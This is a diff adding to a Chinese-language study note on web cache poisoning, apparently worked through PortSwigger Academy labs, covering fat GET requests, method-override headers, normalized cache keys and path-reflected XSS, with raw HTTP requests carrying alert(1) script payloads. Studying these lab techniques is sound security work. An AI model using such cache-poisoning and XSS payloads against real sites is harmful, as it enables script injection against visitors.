@@ -832,6 +832,112 @@ Via: ublw998
 2. `utm_content=123;callback=alert(1)%3Bconsole.log` 會在 Cache 這層不納入 Cache Key
 3. `;callback=alert(1)%3Bconsole.log` Backend Application 會成功解析這段，並且提取第二個 callback，成功 poison response
 
+## Lab: Web cache poisoning via a fat GET request
+
+| Dimension | Description                                                                                                              |
+| --------- | ------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking        |
+| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get |
+
+嘗試 GET With Body
+
+```js
+fetch(location.origin, { body: "123" });
+```
+
+結果被瀏覽器的 `fetch` 擋住
+
+```
+Uncaught (in promise) TypeError: Failed to execute 'fetch' on 'Window': Request with GET/HEAD method cannot have body.
+```
+
+嘗試 POST With Body
+
+```js
+fetch(location.origin, {
+  body: "123",
+  method: "POST",
+});
+```
+
+結果 404 Not Found
+
+這題好像不是 poison 首頁～後來我發現這題也有載入 `/js/geolocate.js`，於是在 Burp Suite Repeater 構造
+
+```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0a0d002c031f5d9e80e8263200940046.web-security-academy.net
+Cookie: session=6jahqtwgCsn2eoZ5kwIf4l6AaqdZ9z1J
+Content-Length: 31
+
+callback=alert(1);console.log
+```
+
+成功看到
+
+```
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 0
+X-Cache: miss
+Content-Length: 207
+
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+alert(1);console.log
+({"country":"United Kingdom"});
+```
+
+這題純靠自己解，忍住沒有問 AI，成就感滿滿～
+
+## X-HTTP-Method-Override
+
+很酷的 Custom Header，可以覆寫原始的 HTTP Request Method，部分框架有支援（我是第一次知道）
+
+## Normalized cache keys
+
+假設我們透過 Burp Suite 找到一個 Reflected XSS
+
+```
+GET /search?key=<script>alert(1)</script>
+```
+
+Server 直接把 key 回顯到網頁（沒有先經過 URL Decode），這樣的 Reflected XSS 就變成只有在 Burp Suite 這種實驗環境可行，因為受害者用瀏覽器訪問時，會自動把 URL Encode
+
+```
+GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+```
+
+但假設 Cache Key 有經過 Normalization，就有可能導致
+
+```
+GET /search?key=<script>alert(1)</script>
+GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+```
+
+是同一把 Cache Key，如此我們就可以用 Burp Suite 發送 `GET /search?key=<script>alert(1)</script>` 來污染 Cache，然後受害者訪問 `GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E` 時，就會吃到 poison 過後的 Cache
+
+## Lab: URL normalization
+
+| Dimension | Description                                                                                                                    |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking              |
+| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization |
+
+這題利用的是 404 頁面的 path reflected xss，需要在 Burp Suite 構造
+
+```
+GET /<script>alert(1)</script> HTTP/2
+Host: 0a67009804c8c3b780c4535900490014.web-security-academy.net
+Cookie: session=1sRfKPxBJzGkrHxXNeO6RtU4Jl656T1f
+```
+
+之後把 `https://0a67009804c8c3b780c4535900490014.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E` 傳送給受害者
+
+我原本有找到 404 頁面似乎有 reflected xss 的跡象，只是當時我是在 querystring 下手，忘記 path 也存在 reflected xss 的可能性，虧我之前還找過 [URL Path Reflected XSS](https://zeroday.hitcon.org/vulnerability/ZD-2025-01087)
+
 ## 參考資料
 
 - https://portswigger.net/web-security/web-cache-poisoning
